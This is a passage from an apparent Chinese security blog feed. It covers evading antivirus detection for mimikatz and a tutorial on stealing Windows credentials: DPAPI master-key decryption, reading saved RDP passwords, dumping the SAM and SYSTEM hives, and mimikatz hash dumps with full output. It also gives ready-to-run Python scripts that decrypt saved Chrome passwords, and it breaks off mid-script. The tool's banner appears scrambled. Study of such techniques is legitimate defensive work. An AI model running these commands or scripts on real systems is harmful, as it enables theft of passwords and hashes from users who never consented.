class="variable">$&#123;newfile&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="comment">## ZIP File ##</span></span><br><span class="line"></span><br><span class="line">zip -r mimi.zip ./windows</span><br></pre></td></tr></table></figure><p>然后把这串字符串给删了，改成hello word</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/15.png" alt="image-20210709155034578"></p><p>然后利用软件对图标进行提取和替换，替换后如下图</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/16.png" alt="image-20210709160159713"></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/17.png" alt="image-20210709160237931" style="zoom: 50%;" /></p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/18.png" alt="image-20210709160254519" style="zoom: 50%;" /></p><p>最终样式</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/FrequentToolCharacteristics/19.png" alt="image-20210709160356633"></p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://chowdera.com/2021/03/20210311155239092N.html</span><br><span class="line">https://uknowsec.cn/posts/notes/FRP%E6%94%B9%E9%80%A0%E8%AE%A1%E5%88%92.html</span><br><span class="line">https://choge.top/2020/08/16/Cobaltstrike%E4%B9%8B%E6%B5%81%E9%87%8F%E9%9A%90%E8%97%8F/</span><br><span class="line">https://gist.githubusercontent.com/S3cur3Th1sSh1t/08623de0c5cc67d36d4a235cec0f5333/raw/dafbd32d1307c4ebb512e4eb7c43c7e1292bcac9/ObfuscateMimi_First.sh</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    <category term="木马" scheme="https://www.ascotbe.com/categories/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="免杀" scheme="https://www.ascotbe.com/categories/%E6%9C%A8%E9%A9%AC/%E5%85%8D%E6%9D%80/"/>
    
    
    <category term="木马" scheme="https://www.ascotbe.com/tags/%E6%9C%A8%E9%A9%AC/"/>
    
    <category term="去除特征" scheme="https://www.ascotbe.com/tags/%E5%8E%BB%E9%99%A4%E7%89%B9%E5%BE%81/"/>
    
  </entry>
  
  <entry>
    <title>Windows本地密码抓取</title>
    <link href="https://www.ascotbe.com/2021/06/09/WindowsGrabPassword/"/>
    <id>https://www.ascotbe.com/2021/06/09/WindowsGrabPassword/</id>
    <published>2021-06-09T15:45:42.000Z</published>
    <updated>2023-01-05T06:17:01.848Z</updated>
    
    <content type="html"><![CDATA[<div class="note danger modern"><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p></div><blockquote><p>前言</p></blockquote><p>学！后续会持续更新</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/1.png" alt="image-20210611163901510"></p><h2 id="系统密码"><a href="#系统密码" class="headerlink" title="系统密码"></a>系统密码</h2><h3 id="DPAPI解密"><a href="#DPAPI解密" class="headerlink" title="DPAPI解密"></a>DPAPI解密</h3><p>使用用户登录密码解密Master Key file，获得Master Key</p><p>固定位置： <code>%APPDATA%\Microsoft\Protect\%SID%</code>下往往有多个Master Key file</p><p>这是为了安全起见，系统每隔90天会自动生成一个新的Master Key(旧的不会删除)</p><p><code>%APPDATA%\Microsoft\Protect\%SID%</code>下存在一个固定文件<code>Preferred</code>，包含最后一个Master Key file的名称和创建时间，文件结构如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct _tagPreferredMasterKey</span><br><span class="line">&#123;</span><br><span class="line">  GUID guidMasterKey;</span><br><span class="line">  FILETIME ftCreated;</span><br><span class="line">&#125; PREFERREDMASTERKEY, *PPREFERREDMASTERKEY;</span><br></pre></td></tr></table></figure><p>完整的流程：</p><ul><li>找到本机的Master Key file</li><li>从Master Key file中获取到Master Key</li><li>通过Master Key解密DPAPI blob获得明文</li></ul><h3 id="本地保存RDP密码"><a href="#本地保存RDP密码" class="headerlink" title="本地保存RDP密码"></a>本地保存RDP密码</h3><p>首先需要打开<strong>隐藏受保护的操作系统文件</strong>，不打开的话就算打开了显示<strong>隐藏的文件、文件夹和驱动器</strong>也是看不到的</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/2.png" alt="image-20210607105330176" style="zoom:50%;" /></p><p>接着打开文件<code>C:\Users\用户名\AppData\Local\Microsoft\Credentials</code>就可以看到保存的数据了</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/3.png" alt="image-20210609134443326"></p><p>使用<code>cmdkey /line</code>命令可以查看本地保存了哪些密码，如果你连过其他服务器如果点击了保存密码就能抓取到</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/4.png" alt="image-20210607105639249"></p><p>使用🥝读取</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSIONID</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/5.png" alt="image-20210608171226583"></p><p>获取到<strong>guidMasterKey</strong>其实就是我们的master key file名称</p><blockquote><p>切记一点不同的SESSIONID如果间隔时间超过90天那么对应的guidMasterKey也是不同的</p></blockquote><p>通过命令获取到Master Key file的Master Key，下文中<strong>GUID==Master Key file</strong>，<strong>MasterKey==Master Key</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::dpapi</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : 樱岛麻衣</span><br><span class="line">Logon Server      : 樱岛麻衣</span><br><span class="line">Logon Time        : 2021/6/7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">         [00000000]</span><br><span class="line">         * GUID      :  &#123;d3fcdbfb-06bd-49f0-98b4-ac08664c176a&#125;</span><br><span class="line">         * Time      :  2021/6/7 9:37:59</span><br><span class="line">         * MasterKey :  7da666987b2b6a51db3148cd01a6fe460a79315d1678a24b327d251c4f9138eecbb7ca4919de8de678628963761ee731a1316b78a6a982d0d4a9c590f5171c9e</span><br><span class="line">         * sha1(key) :  efd1c9d7290d13b3ecc1e288accfc5d6707d3403</span><br><span class="line">         [00000001]</span><br><span class="line">         * GUID      :  &#123;33449413-8697-4a85-a075-778b49015fbe&#125;</span><br><span class="line">         * Time      :  2021/6/8 17:17:37</span><br><span class="line">         * MasterKey :  0ac77f164c38e751f303e26d883cd15e3eb3861f2d69c2ba192035511bfc8f2880f206ef238de4d282384c813326feeaef364b9089c86a97a5169f31dbd319ee</span><br><span class="line">         * sha1(key) :  f45701db86a93d9b860be725d7eaf32a9a684a77</span><br><span class="line">         [00000002]</span><br><span class="line">         * GUID      :  &#123;788f0828-1d1e-478d-adf6-7a37e92182e8&#125;</span><br><span class="line">         * Time      :  2021/6/7 18:01:08</span><br><span class="line">         * MasterKey :  6a9ece2f3bd683c2ac14c69e13465399e9ce20c2930dd51dd9378eed800b06b409f7f4bef926e503d85a0b9e5e1f4cc5ccd01fb2ddaa8de90d086bf3a8ae3bf3</span><br><span class="line">         * sha1(key) :  f2d6c58b2d2f0a91e07dc0d1cb7db7cb8935f955</span><br></pre></td></tr></table></figure><p>只需要使用<strong>SESSIONID</strong>对应的GUID和MasterKey就能解密数据了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::cred /in:C:\Users\ascotbe\AppData\Local\Microsoft\Credentials\SESSION /masterkey:对应的GUID MasterKey</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/6.png" alt="image-20210609134218324"></p><p><strong>TargetName</strong>是目标机器，<strong>UserName</strong>是账号，<strong>CredentialBlob</strong>是密码</p><h3 id="本机密码"><a href="#本机密码" class="headerlink" title="本机密码"></a>本机密码</h3><h4 id="通过注册列表抓取密码"><a href="#通过注册列表抓取密码" class="headerlink" title="通过注册列表抓取密码"></a>通过注册列表抓取密码</h4><p>首先需要管理员权限，抓取注册列表中保存的哈希</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">reg save HKLM\SAM SAM</span><br></pre></td></tr></table></figure><p>然后通过🥝进行解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure><p>解密后的数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">尝试新的跨平台 PowerShell https://aka.ms/pscore6</span><br><span class="line"></span><br><span class="line">PS C:\Users\ascotbe&gt; cd .\Desktop\</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; reg save HKLM\SAM SAM</span><br><span class="line">操作成功完成。</span><br><span class="line">PS C:\Users\ascotbe\Desktop&gt; .\x64.exe</span><br><span class="line"></span><br><span class="line">  .#####.   EeLrXMiD 2.2.0 (x64) #19041 Oct 10 2020 14:46:27</span><br><span class="line"> .## ^ ##.  &quot;e2G6OxuvUXNR1&#x27;Amour&quot; - (IcaHL)</span><br><span class="line"> ## / \ ##  /*** ST1KQSnf huXMA `gVhmWw70VD` ( NceCVtrwTckaqiPu3XOVsQl )</span><br><span class="line"> ## \ / ##       &gt; https://blog.gVhmWw70VD.com/EeLrXMiD</span><br><span class="line"> &#x27;## v ##&#x27;       Hp6bmVPNVLO9i7B             ( FiLGZos4eo99IXHOADBc44Ir )</span><br><span class="line">  &#x27;#####&#x27;        &gt; https://ljrq4GxgPj6NY7 / https://A35s5WaTWwdjV2m6 ***/</span><br><span class="line"></span><br><span class="line">EeLrXMiD # privilege::debug</span><br><span class="line">Privilege &#x27;20&#x27; OK</span><br><span class="line"></span><br><span class="line">EeLrXMiD # lsadump::sam /sam:SAM /system:SYSTEM</span><br><span class="line">Domain : 樱岛麻衣</span><br><span class="line">SysKey : 42939b566ede597c3284d1bd23b15a97</span><br><span class="line">Local SID : S-1-5-21-1645164750-2672341361-3879437546</span><br><span class="line"></span><br><span class="line">SAMKey : b58a3643feb8148887485d5b702aaf3f</span><br><span class="line"></span><br><span class="line">RID  : 000001f4 (500)</span><br><span class="line">User : Administrator</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 900fff43b7507160b3e239892c034c22</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 8185175d7c176c6decf21cbfbde54df0a4b86cca948bb660091d2a873073b26b</span><br><span class="line">      aes128_hmac       (4096) : ce32484a789bb52f0e43fa09ddac2bf0</span><br><span class="line">      des_cbc_md5       (4096) : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49Administrator</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : f8f7ad86cd6e9840</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000001f5 (501)</span><br><span class="line">User : Guest</span><br><span class="line"></span><br><span class="line">RID  : 000001f7 (503)</span><br><span class="line">User : DefaultAccount</span><br><span class="line"></span><br><span class="line">RID  : 000001f8 (504)</span><br><span class="line">User : WDAGUtilityAccount</span><br><span class="line">  Hash NTLM: 4c5c287f286dce27cdd13c6b221979df</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 38ab6a222bbf783640bdcbb714227d57</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : c60e0605a0f960188d252efb376231de1e1fb3c2fbfd66cbc4a528d364a37bfc</span><br><span class="line">      aes128_hmac       (4096) : fb6b091efaa644e306673fcd565ce4f4</span><br><span class="line">      des_cbc_md5       (4096) : a1648949c202689e</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : WDAGUtilityAccount</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : a1648949c202689e</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">RID  : 000003e8 (1000)</span><br><span class="line">User : ascotbe</span><br><span class="line">  Hash NTLM: 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line"></span><br><span class="line">Supplemental Credentials:</span><br><span class="line">* Primary:NTLM-Strong-NTOWF *</span><br><span class="line">    Random Value : 42d6e016527f7bce204d94cc40baa99a</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos-Newer-Keys *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Default Iterations : 4096</span><br><span class="line">    Credentials</span><br><span class="line">      aes256_hmac       (4096) : 35c0a798a120c3b112bcdb7636b8dd3e3b12284c0e85a5b1c93bfbe9c4b83c02</span><br><span class="line">      aes128_hmac       (4096) : 12a06f6bb5ff719a314ddfe96c83c69e</span><br><span class="line">      des_cbc_md5       (4096) : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line">* Packages *</span><br><span class="line">    NTLM-Strong-NTOWF</span><br><span class="line"></span><br><span class="line">* Primary:Kerberos *</span><br><span class="line">    Default Salt : ASCOTBE1B49ascotbe</span><br><span class="line">    Credentials</span><br><span class="line">      des_cbc_md5       : fdd661fe76542cdf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">EeLrXMiD #</span><br></pre></td></tr></table></figure><p>我们只需要查看最后一个<strong>ascotbe</strong>（我本机这个是管理员用户）这个账户的Hash NTLM即可知道本机密码了，通过网站解密</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/7.png" alt="image-20210610150310107"></p><h4 id="通过mimikatz抓取密码"><a href="#通过mimikatz抓取密码" class="headerlink" title="通过mimikatz抓取密码"></a>通过mimikatz抓取密码</h4><p>需要管理员权限执行</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::logonpasswords</span><br></pre></td></tr></table></figure><p>即可得出密码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">EeLrXMiD # sekurlsa::logonpasswords</span><br><span class="line"></span><br><span class="line">Authentication Id : 0 ; 229076 (00000000:00037ed4)</span><br><span class="line">Session           : Interactive from 1</span><br><span class="line">User Name         : ascotbe</span><br><span class="line">Domain            : 樱岛麻衣</span><br><span class="line">Logon Server      : 樱岛麻衣</span><br><span class="line">Logon Time        : 2021/6/7 9:37:53</span><br><span class="line">SID               : S-1-5-21-1645164750-2672341361-3879437546-1000</span><br><span class="line">        mSv :</span><br><span class="line">         [00000003] Primary</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : 樱岛麻衣</span><br><span class="line">         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0</span><br><span class="line">         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709</span><br><span class="line">        tsPkG :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        wDiGeST :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        kErberoS :</span><br><span class="line">         * Username : ascotbe</span><br><span class="line">         * Domain   : (null)</span><br><span class="line">         * Password : (null)</span><br><span class="line">        sSp :</span><br><span class="line">        crEdMan :</span><br><span class="line">        clOuDAp :</span><br></pre></td></tr></table></figure><h2 id="浏览器密码"><a href="#浏览器密码" class="headerlink" title="浏览器密码"></a>浏览器密码</h2><h3 id="Chrome浏览器数据"><a href="#Chrome浏览器数据" class="headerlink" title="Chrome浏览器数据"></a>Chrome浏览器数据</h3><p>Chrome的配置文件存放在<code>%LocalAppData%</code>目录下。如果有两个Google Chrome账号那么每个账号会有不同的配置文件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default （第一个配置文件的名称）</span><br><span class="line">C:\Users\admin\AppData\Local\Google\Chrome\User Data\Profile 2 （后续的配置文件以迭代数字方式命名）</span><br></pre></td></tr></table></figure><p>目录中的<code>Login Data</code>是SQLite 3数据库文件，里面存放了各种网站和账号等信息。</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/8.png" alt="image-20210609143728350"></p><p>我们只需要关注logins这张表即可</p><ul><li>origin_url:登录网址</li><li>username_value:用户名</li><li>password_value:被加密的用户密码</li></ul><blockquote><p>chrome version 80（80.0.3987.163） 版本前</p></blockquote><p>chrome80以前的版本是直接可以通过DPAPI中的解密函数 CryptUnprotectData来进行解密的。</p><p>测试版本：<a href="https://dl.google.com/release2/chrome/XASj0J0BUKotBRR0eLPLxw_79.0.3945.88/79.0.3945.88_chrome_installer.exe">chrome 79.0.3945.88</a></p><h4 id="A用户解A的chrome密码"><a href="#A用户解A的chrome密码" class="headerlink" title="A用户解A的chrome密码"></a>A用户解A的chrome密码</h4><p>直接使用命令即可解密出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;C:\Users\ascotbe\AppData\Local\Google\Chrome\User Data\Default\Login Data&quot; /unprotect</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/9.png" alt="image-20210609154742793"></p><p>也可以直接使用脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.passwordList = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_chrome_db</span>(<span class="params">self</span>):</span><br><span class="line">        _full_path = os.path.join(APP_DATA_PATH,DB_PATH)</span><br><span class="line">        _temp_path = os.path.join(APP_DATA_PATH,<span class="string">&#x27;sqlite_file&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> os.path.exists(_temp_path):</span><br><span class="line">            os.remove(_temp_path)</span><br><span class="line">        shutil.copyfile(_full_path,_temp_path)</span><br><span class="line">        self.show_password(_temp_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show_password</span>(<span class="params">self,db_file</span>):</span><br><span class="line">        conn = sqlite3.connect(db_file)</span><br><span class="line">        _sql = <span class="string">&#x27;select signon_realm,username_value,password_value from logins&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> row <span class="keyword">in</span> conn.execute(_sql):</span><br><span class="line">            ret = win32crypt.CryptUnprotectData(row[<span class="number">2</span>],<span class="literal">None</span>,<span class="literal">None</span>,<span class="literal">None</span>,<span class="number">0</span>)</span><br><span class="line">            <span class="comment">#密码解析后得到字节码，需要进行解码操作</span></span><br><span class="line">            _info = <span class="string">&#x27;url:%-40s username:%-20s password:%s\n&#x27;</span> %\</span><br><span class="line">                    (row[<span class="number">0</span>][:<span class="number">50</span>],row[<span class="number">1</span>],ret[<span class="number">1</span>].decode())</span><br><span class="line">            self.passwordList.append(_info)</span><br><span class="line">        conn.close()</span><br><span class="line">        os.remove(db_file)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">save_passwords</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;password.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.writelines(self.passwordList)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    Main = ChromePassword()</span><br><span class="line">    Main.get_chrome_db()</span><br><span class="line">    Main.save_passwords()</span><br></pre></td></tr></table></figure><h4 id="B用户解A的chrome密码"><a href="#B用户解A的chrome密码" class="headerlink" title="B用户解A的chrome密码"></a>B用户解A的chrome密码</h4><p>首先我们需要获取到A用户的MasterKey值，就可以解密了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpapi::chrome /in:&quot;C:\Users\ascotbe\Desktop\Login Data&quot; /unprotect /masterkey:831d02bf734632f7aaa7719f5ec593111997c9aeefabe71ac4e4a963de546784662fcec40722a4656870698cff96c348a37d669131e99401e0947fa355e8fd0b</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/10.png" alt="image-20210609161248445"></p><blockquote><p>chrome version 80 （80.0.3987.163）版本后</p></blockquote><p>利用主密钥使用AES-GCM加密算法加密密码存放Login Data数据库，然后用DPAPI的加密函数CryptProtectData加密主密钥存放在Local State文件。其中Local State文件存放在如下地址（假设windows用户为admin），本质是个json文件，其中一个值os_crypt下的encrypted_key是解密需要用的被加密后的密钥。</p><p>解密流程</p><ol><li>获取local state和Login Data文件位置</li><li>获取local state中加密的key(base64编码)</li><li>数据库语句提取Login Data sqllite文件的password_value</li><li>DPAPI解密加密key</li><li>ase-gcm解密password_value</li></ol><p>脚本如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># !/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span>  shutil</span><br><span class="line"><span class="keyword">import</span>  sqlite3</span><br><span class="line"><span class="keyword">import</span>  win32crypt</span><br><span class="line"><span class="keyword">import</span> json,base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> (</span><br><span class="line">    Cipher, algorithms, modes</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">APP_DATA_PATH= os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>]</span><br><span class="line">DB_PATH = <span class="string">r&#x27;Google\Chrome\User Data\Default\Login Data&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NONCE_BYTE_SIZE = <span class="number">12</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">cipher, plaintext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    encryptor = cipher.encryptor()</span><br><span class="line">    ciphertext = encryptor.update(plaintext)</span><br><span class="line">    <span class="keyword">return</span> (cipher, ciphertext, nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">cipher, ciphertext, nonce</span>):</span><br><span class="line">    cipher.mode = modes.GCM(nonce)</span><br><span class="line">    decryptor = cipher.decryptor()</span><br><span class="line">    <span class="keyword">return</span> decryptor.update(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_cipher</span>(<span class="params">key</span>):</span><br><span class="line">    cipher = Cipher(</span><br><span class="line">        algorithms.AES(key),</span><br><span class="line">        <span class="literal">None</span>,</span><br><span class="line">        backend=default_backend()</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dpapi_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">DATA_BLOB</span>(ctypes.Structure):</span><br><span class="line">        _fields_ = [(<span class="string">&#x27;cbData&#x27;</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">&#x27;pbData&#x27;</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, <span class="built_in">len</span>(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unix_decrypt</span>(<span class="params">encrypted</span>):</span><br><span class="line">    <span class="keyword">if</span> sys.platform.startswith(<span class="string">&#x27;linux&#x27;</span>):</span><br><span class="line">        password = <span class="string">&#x27;peanuts&#x27;</span></span><br><span class="line">        iterations = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">raise</span> NotImplementedError</span><br><span class="line"></span><br><span class="line">    <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">    <span class="keyword">from</span> Crypto.Protocol.KDF <span class="keyword">import</span> PBKDF2</span><br><span class="line"></span><br><span class="line">    salt = <span class="string">&#x27;saltysalt&#x27;</span></span><br><span class="line">    iv = <span class="string">&#x27; &#x27;</span> * <span class="number">16</span></span><br><span class="line">    length = <span class="number">16</span></span><br><span class="line">    key = PBKDF2(password, salt, length, iterations)</span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC, IV=iv)</span><br><span class="line">    decrypted = cipher.decrypt(encrypted[<span class="number">3</span>:])</span><br><span class="line">    <span class="keyword">return</span> decrypted[:-<span class="built_in">ord</span>(decrypted[-<span class="number">1</span>])]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key_from_local_state</span>():</span><br><span class="line">    jsn = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(os.path.join(os.environ[<span class="string">&#x27;LOCALAPPDATA&#x27;</span>],</span><br><span class="line">        <span class="string">r&quot;Google\Chrome\User Data\Local State&quot;</span>),encoding=<span class="string">&#x27;utf-8&#x27;</span>,mode =<span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsn = json.loads(<span class="built_in">str</span>(f.readline()))</span><br><span class="line">    <span class="keyword">return</span> jsn[<span class="string">&quot;os_crypt&quot;</span>][<span class="string">&quot;encrypted_key&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_decrypt</span>(<span class="params">encrypted_txt</span>):</span><br><span class="line">    encoded_key = get_key_from_local_state()</span><br><span class="line">    encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">    encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">    key = dpapi_decrypt(encrypted_key)</span><br><span class="line">    nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">    cipher = get_cipher(key)</span><br><span class="line">    <span class="keyword">return</span> decrypt(cipher,encrypted_txt[<span class="number">15</span>:],nonce)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">ChromePassword</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.passwordList = 